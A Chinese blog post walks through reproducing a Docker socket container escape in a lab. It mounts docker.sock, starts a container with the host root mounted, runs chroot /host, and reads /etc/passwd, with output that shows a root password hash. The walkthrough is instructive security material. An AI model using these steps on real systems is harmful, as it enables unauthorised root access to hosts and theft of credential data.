---
title: "Docker Socket 容器逃逸复现"
date: "2024-08-04 11:16:43"
updated: "2026-05-30 19:31:14"
categories: ["文章", "漏洞分析"]
tags: ["docker 逃逸"]
thumbnail: "/wp-content/uploads/2025/img-9ab40ed628ef.png"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "621"
---
<h2 class="md-end-block md-heading"><span class="md-plain">一、原理概述</span></h2>
<p class="md-end-block md-p"><span class="md-plain">Docker Socket（</span><span class="md-pair-s" spellcheck="false"><code>/var/run/docker.sock</code></span><span class="md-plain">）是 Docker 守护进程与客户端通信的 UNIX 套接字文件。当 Ubuntu 18.04 容器挂载该文件时，容器内进程可通过 Docker API 操控宿主机 Docker 服务，进而创建挂载宿主机根目录的新容器，实现从容器到宿主机的权限逃逸。</span></p>

<h2 class="md-end-block md-heading md-focus"><span class="md-plain">二、环境准备（宿主机操作）</span></h2>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">拉取 Ubuntu 18.04 镜像</span></strong></span></p>



```bash
docker pull ubuntu:18.04
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">启动挂载 Docker Socket 的容器</span></strong></span></p>



```bash
# 关键：将宿主机docker.sock挂载到容器内相同路径
docker run -itd --name socket_escape -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>-itd</code></span><span class="md-plain">：交互式后台运行，便于后续进入容器操作</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>-v</code></span><span class="md-plain">：挂载宿主机 Docker Socket 到容器，是逃逸的核心前提</span></p>
</li>
</ul>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">三、容器内环境配置</span></h2>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">进入目标容器</span></strong></span></p>



```bash
docker exec -it socket_escape /bin/bash
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">安装 Docker 客户端</span></strong></span> <span class="md-plain">Ubuntu 18.04 需通过 apt 安装 Docker：</span></p>



```bash
# 更新软件源（Ubuntu 18.04推荐用apt-get）
apt-get update -y
​
# 安装必要依赖
apt-get install -y apt-transport-https ca-certificates curl software-properties-common
​
# 添加Docker官方GPG密钥
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
​
# 添加Docker软件源（适配Ubuntu 18.04的bionic版本）
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
​
# 安装Docker CE客户端
apt-get update -y && apt-get install -y docker-ce
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">验证 Docker 客户端可用性</span></strong></span></p>



```bash
docker --version  # 显示版本信息即安装成功
docker ps         # 能列出宿主机容器，证明已通过socket连接宿主机Docker服务
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">示例输出：</span></p>
<img class="alignnone size-full wp-image-622" src="/wp-content/uploads/2025/img-9ab40ed628ef.png" alt="" width="844" height="108" /></li>
</ul>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">四、逃逸步骤（容器内执行）</span></h2>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">创建挂载宿主机根目录的新容器</span></strong></span> <span class="md-plain">利用宿主机 Docker 服务，创建一个将宿主机</span><span class="md-pair-s" spellcheck="false"><code>/</code></span><span class="md-plain">挂载到容器</span><span class="md-pair-s" spellcheck="false"><code>/host</code></span><span class="md-plain">的新容器：</span></p>



```bash
docker run -it --rm -v /:/host ubuntu:18.04 /bin/bash
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>--rm</code></span><span class="md-plain">：退出后自动清理，减少痕迹</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>-v /:/host</code></span><span class="md-plain">：核心挂载，宿主机根目录映射到新容器</span><span class="md-pair-s" spellcheck="false"><code>/host</code></span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">切换到宿主机根目录</span></strong></span> <span class="md-plain">在新容器内执行</span><span class="md-pair-s" spellcheck="false"><code>chroot</code></span><span class="md-plain">命令，将当前环境切换为宿主机文件系统：</span></p>



```bash
chroot /host
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行过程示例：</span></p>
<img class="alignnone size-full wp-image-623" src="/wp-content/uploads/2025/img-2dfdc592052a.png" alt="" width="695" height="39" /></li>
</ul>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">五、验证逃逸结果</span></h2>
<p class="md-end-block md-p"><span class="md-plain">执行以下命令确认已获取宿主机权限：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">查看用户 ID</span></strong></span><span class="md-plain">（应为宿主机 root）：</span></p>



```bash
id
```


<p class="md-end-block md-p"><span class="md-plain">输出示例：</span><span class="md-pair-s" spellcheck="false"><code>uid=0(root) gid=0(root) groups=0(root)</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">查看宿主机 hostname</span></strong></span><span class="md-plain">：</span></p>



```bash
hostname
```


<p class="md-end-block md-p"><span class="md-plain">输出示例：</span><span class="md-pair-s" spellcheck="false"><code>6195a62efdbd</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">查看宿主机用户信息</span></strong></span><span class="md-plain">：</span></p>



```bash
cat /etc/passwd
```


<p class="md-end-block md-p"><span class="md-plain">输出包含宿主机本地用户（如</span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>lang</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>hacker</code></span><span class="md-plain">等），部分内容示例：</span></p>



```plaintext
root:$6$Du1ukr7z$O3kiLXL/iyvOZTO7CYGsD2aePJ8Zp1ihpHwC9hi06Ng9xk5m1t8vehojD9Uhqcll17bI4UNdskCBBZqofrwGB1:0:0:root:/root:/bin/bash
lang:x:1000:1000:lang,,,:/home/lang:/bin/bash
hacker:x:1002:1002:,,,:/home/hacker:/bin/bash
```


</li>
</ol>
<h2><img class="alignnone size-full wp-image-624" src="/wp-content/uploads/2025/img-356bd3258cb0.png" alt="" width="844" height="756" /></h2>
<h2 class="md-end-block md-heading"><span class="md-plain">六、清理操作</span></h2>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">退出容器</span></strong></span><span class="md-plain">：连续执行</span><span class="md-pair-s" spellcheck="false"><code>exit</code></span><span class="md-plain">退出新容器和原始容器</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">删除容器</span></p>
<p class="md-end-block md-p"><span class="md-plain">（宿主机执行）：</span></p>



```bash
docker rm -f socket_escape
```


</li>
</ol>
<p class="md-end-block md-p"></p>
